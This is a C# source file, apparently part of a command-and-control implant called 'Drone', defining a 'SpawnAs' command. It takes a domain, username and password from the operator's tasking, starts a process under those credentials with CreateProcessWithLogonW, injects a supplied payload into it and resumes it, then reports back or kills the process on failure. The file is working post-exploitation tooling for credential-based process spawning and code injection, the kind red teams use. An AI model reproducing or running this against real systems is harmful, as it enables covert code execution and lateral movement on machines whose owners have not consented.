using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class SpawnAs : DroneCommand
{
    public override byte Command => 0x19;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var userDomain = task.Arguments[0].Split('\\');
            
        var domain = userDomain[0];
        var username = userDomain[1];
        var password = task.Arguments[1];

        var spawnTo = Drone.Config.Get<string>(Setting.SpawnTo);

        if (!Win32.CreateProcessWithLogonW(domain, username, password, spawnTo, true, out var pi))
            throw new Win32Exception(Marshal.GetLastWin32Error());

        var injector = new Injector(task.Artefact);

        if (injector.InjectAndResume(pi))
        {
            await Drone.SendTaskComplete(task);
            return;
        }

        await Drone.SendError(task, $"Failed to inject into PID {pi.dwProcessId}.");
        
        // kill spawned process
        using var process = Process.GetProcessById(pi.dwProcessId);
        
        if (!process.HasExited)
            process.Kill();
    }
}